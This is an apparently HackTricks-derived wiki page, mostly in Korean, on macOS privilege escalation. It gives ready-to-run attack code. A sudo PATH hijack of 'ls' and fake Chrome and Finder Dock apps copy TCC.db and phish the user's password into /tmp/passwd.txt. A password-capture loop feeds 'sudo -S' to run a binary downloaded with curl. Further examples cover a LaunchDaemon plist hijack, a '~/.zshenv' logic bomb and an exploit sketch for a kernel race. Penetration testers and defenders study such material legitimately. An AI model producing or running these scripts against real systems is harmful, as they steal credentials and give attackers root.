# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation을 찾고 있다면 다음으로 이동하세요:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

**Linux/Unix에 영향을 주는 privilege escalation 관련 트릭 대부분은 MacOS** 시스템에도 영향을 준다는 점에 유의하세요. 따라서 다음을 확인하세요:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

원본 [Sudo Hijacking technique은 Linux Privilege Escalation 게시물](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)에서 확인할 수 있습니다.

하지만 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지**합니다. 즉, 이 공격을 수행하는 또 다른 방법은 피해자가 **sudo를 실행할 때** 실행하게 될 **다른 binary를 hijack하는 것**입니다:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
터미널을 사용하는 사용자는 **Homebrew가 설치되어 있을 가능성이 매우 높다**는 점에 유의하세요. 따라서 **`/opt/homebrew/bin`**의 바이너리를 hijack할 수 있습니다.

### Dock 사칭

일부 **social engineering**을 사용하면 Dock 내부에서 예를 들어 **Google Chrome을 사칭**하고 실제로 자신의 스크립트를 실행할 수 있습니다.

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에 Chrome이 있는지 확인하고, 있다면 해당 항목을 **제거**한 다음 Dock 배열에서 **같은 위치**에 **fake** **Chrome 항목을 추가**합니다.

<details>
<summary>Chrome Dock 사칭 스크립트</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- **Dock에서 Finder를 제거할 수 없으므로**, Dock에 추가할 예정이라면 가짜 Finder를 실제 Finder 바로 옆에 배치할 수 있습니다. 이를 위해서는 **Dock 배열의 시작 부분에 가짜 Finder 항목을 추가해야 합니다**.
- 다른 방법은 Dock에 배치하지 않고 그냥 여는 것입니다. "Finder가 Finder 제어를 요청함"은 그다지 이상하지 않습니다.
- 끔찍한 대화 상자 없이 **password를 묻지 않고 root로 escalate**하는 또 다른 방법은, 권한 있는 작업을 수행하기 위해 Finder가 실제로 password를 요청하도록 만드는 것입니다:
- Finder에 새 **`sudo`** 파일을 **`/etc/pam.d`**에 복사하도록 요청합니다. (password를 묻는 prompt에는 "Finder가 sudo를 복사하려고 합니다"라고 표시됩니다.)
- 새 **Authorization Plugin**을 복사하도록 Finder에 요청합니다. (파일 이름을 제어할 수 있으므로 password를 묻는 prompt에는 "Finder가 Finder.bundle을 복사하려고 합니다"라고 표시됩니다.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware는 사용자의 상호작용을 악용하여 **sudo 권한을 사용할 수 있는 password를 capture**한 뒤 programmatically 재사용하는 경우가 많습니다. 일반적인 흐름은 다음과 같습니다.

1. `whoami`를 사용하여 logged in user를 식별합니다.
2. `dscl . -authonly "$user" "$pw"`가 성공을 반환할 때까지 **password prompt를 반복**합니다.
3. credential을 (예: `/tmp/.pass`) cache하고 `sudo -S`(stdin을 통한 password)를 사용하여 privileged action을 수행합니다.

간단한 최소 chain 예시:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
탈취한 password는 이후 **`xattr -c`로 Gatekeeper quarantine을 해제**하고, LaunchDaemons 또는 기타 privileged files를 복사하며, 추가 단계를 비대화형으로 실행하는 데 재사용할 수 있습니다.

## 최신 macOS-specific vectors (2023–2025)

### 더 이상 사용되지 않는 `AuthorizationExecuteWithPrivileges`도 여전히 사용 가능

`AuthorizationExecuteWithPrivileges`는 10.7에서 deprecated되었지만 **Sonoma/Sequoia에서도 여전히 작동합니다**. 많은 commercial updaters가 신뢰할 수 없는 경로와 함께 `/usr/libexec/security_authtrampoline`을 호출합니다. 대상 binary가 user-writable이라면 trojan을 심고 정상적인 prompt를 이용할 수 있습니다:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
위의 **masquerading tricks**와 결합해 믿을 만한 password dialog를 표시합니다.


### Privileged helper / XPC triage

많은 최신 서드파티 macOS privescs는 동일한 패턴을 따릅니다. **root LaunchDaemon**이 **`/Library/PrivilegedHelperTools`**에서 **Mach/XPC service**를 노출한 다음, helper가 client를 **검증하지 않거나**, **너무 늦게** 검증하거나(PID race), **user-controlled path/script**를 사용하는 **root method**를 노출합니다. 이는 VPN client, game launcher 및 updater에서 발생한 최근 helper bug의 배경이 된 bug class입니다.

빠른 triage 체크리스트:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
특히 다음과 같은 helper에 주의하세요:

- 작업이 `launchd`에 로드된 상태로 남아 **uninstall 이후에도** 요청을 계속 수락하는 경우
- **`/Applications/...`** 또는 non-root 사용자가 쓰기 가능한 다른 경로에서 script를 실행하거나 configuration을 읽는 경우
- **PID 기반** 또는 **bundle-id-only** peer validation에 의존하여 raceable할 수 있는 경우

helper authorization bug에 대한 자세한 내용은 [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)를 확인하세요.

### PackageKit script environment inheritance (CVE-2024-27822)

Apple이 **Sonoma 14.5**, **Ventura 13.6.7** 및 **Monterey 12.7.5**에서 이를 수정하기 전까지, **`Installer.app`** / **`PackageKit.framework`**를 통한 사용자가 시작한 install은 현재 사용자의 environment 내에서 **PKG scripts를 root 권한으로 실행**할 수 있었습니다. 즉, package가 **`#!/bin/zsh`**를 사용하는 경우, victim이 package를 install할 때 공격자의 **`~/.zshenv`**를 load하고 이를 **root 권한으로 실행**할 수 있었습니다.

이는 특히 **logic bomb**로 흥미롭습니다. 사용자의 account에 foothold와 쓰기 가능한 shell startup file만 확보한 뒤, vulnerable한 **zsh 기반** installer가 사용자에 의해 실행될 때까지 기다리면 됩니다. 이는 일반적으로 **MDM/Munki** deployment에는 적용되지 않습니다. 이러한 deployment는 root 사용자의 environment 내에서 실행되기 때문입니다.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
installer-specific abuse를 더 자세히 살펴보려면 [this page](macos-files-folders-and-binaries/macos-installers-abuse.md)도 확인하세요.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist 또는 해당 `ProgramArguments` target이 **user-writable**인 경우, 이를 교체한 다음 launchd가 reload하도록 강제하여 privilege escalation을 수행할 수 있습니다:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
이는 **CVE-2025-24085**에 대해 공개된 exploit pattern을 반영한 것으로, writable plist를 악용해 attacker code를 root 권한으로 실행했습니다.

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update`의 **race**로 인해 local attacker는 여러 thread에서 `setgid()`/`getgid()` loop를 실행해 torn `memcpy`가 발생할 때까지 경쟁함으로써 read-only credential pointer(`proc_ro.p_ucred`)를 손상시킬 수 있습니다. 손상에 성공하면 **uid 0** 및 kernel memory access를 얻습니다. Minimal PoC 구조:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming과 함께 사용하여 pointer가 다시 읽히는 위치에 제어된 데이터를 배치합니다. 취약한 빌드에서는 SIP bypass 요구 사항 없이 안정적인 **local kernel privesc**가 가능합니다.

### Migration assistant를 통한 SIP bypass ("Migraine", CVE-2023-32369)

이미 root를 확보했더라도 SIP는 여전히 system location에 대한 쓰기를 차단합니다. **Migraine** bug는 Migration Assistant entitlement `com.apple.rootless.install.heritable`을 악용하여 SIP bypass를 상속하는 child process를 생성하고, 보호된 path(예: `/System/Library/LaunchDaemons`)를 덮어씁니다. 해당 chain은 다음과 같습니다.

1. live system에서 root를 확보합니다.
2. 공격자가 제어하는 binary를 실행하도록 조작된 state로 `systemmigrationd`를 trigger합니다.
3. 상속된 entitlement를 사용하여 SIP-protected file을 patch하고, reboot 후에도 persistence를 유지합니다.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

여러 Apple daemon은 XPC를 통해 **NSPredicate** object를 수신하고 `expressionType` field만 검증합니다. 이 field는 attacker-controlled입니다. 임의의 selector를 평가하는 predicate를 조작하면 **root/system XPC service에서 code execution**을 달성할 수 있습니다(예: `coreduetd`, `contextstored`). initial app sandbox escape와 결합하면 **user prompt 없이 privilege escalation**이 가능합니다. predicate를 deserialize하지만 robust visitor가 없는 XPC endpoint를 찾으십시오.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass 및 privilege escalation

**Any user**(unprivileged user 포함)는 time machine snapshot을 생성하고 mount하여 해당 snapshot의 **모든 파일에 access**할 수 있습니다.\
필요한 **유일한 privileged 조건**은 사용되는 application(예: `Terminal`)이 **Full Disk Access**(FDA) access(`kTCCServiceSystemPolicyAllfiles`)를 보유하는 것이며, 이는 admin이 부여해야 합니다.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

더 자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## 민감한 정보

이는 권한 상승에 유용할 수 있습니다:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## 참고 자료

- [Microsoft "Migraine" SIP 우회 (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit 권한 상승](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: macOS용 AWS Client VPN 로컬 권한 상승](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
